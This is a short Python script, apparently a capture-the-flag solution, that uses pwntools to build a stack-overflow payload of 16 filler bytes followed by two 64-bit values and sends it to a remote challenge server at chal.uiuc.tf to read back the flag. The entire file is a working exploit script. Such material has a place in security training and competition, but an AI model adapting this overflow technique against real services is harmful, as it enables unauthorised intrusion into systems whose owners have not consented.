from pwn import *
payload = 16* b'A'
payload += p64(0x12345678) + p64(0x12345679)
print(payload)
p = remote('chal.uiuc.tf', 2003)
print(p.recvline())
p.sendline(payload)
print(p.recvuntil('}'))

